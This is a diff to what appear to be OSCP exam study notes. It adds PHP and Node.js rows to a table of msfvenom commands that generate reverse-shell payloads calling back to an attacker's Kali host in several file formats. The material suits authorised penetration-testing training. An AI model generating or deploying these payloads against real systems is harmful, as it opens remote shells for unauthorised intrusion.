@@ -541,6 +541,8 @@ Examples: [digitalworld.local-bravery](https://github.com/joetanx/oscp/blob/main
 |HTML Application|`msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f hta-psh -o /var/www/html/reverse.hta`|
 |VBA|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f vba-psh -o /var/www/html/reverse.vba`|
 |Java WAR (Tomcat)|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=4444 -f war -o reverse.war`|
+|PHP|`msfvenom -p php/reverse_php LHOST=$KALI LPORT=4444 -f raw -o reverse.php`|
+|Node.js|`msfvenom -p nodejs/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f js_le -o reverse.js`|
 
 ☝️ Use `linux/x86/shell_reverse_tcp` or `windows/shell_reverse_tcp` to generate a x86 payload
 
